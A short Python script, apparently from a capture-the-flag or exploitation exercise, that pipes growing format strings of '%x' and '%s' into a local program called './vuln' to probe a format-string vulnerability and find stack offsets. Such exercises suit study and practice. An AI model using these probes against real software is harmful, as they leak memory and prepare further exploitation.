import os


build_str = ""
for i in range(0, 65):
    build_str = "%x" * i + "%s"
    res = os.system(f"echo {build_str} | ./vuln")
    print(res)
    # print(res)
    # %x%x%x%d    -> %4$d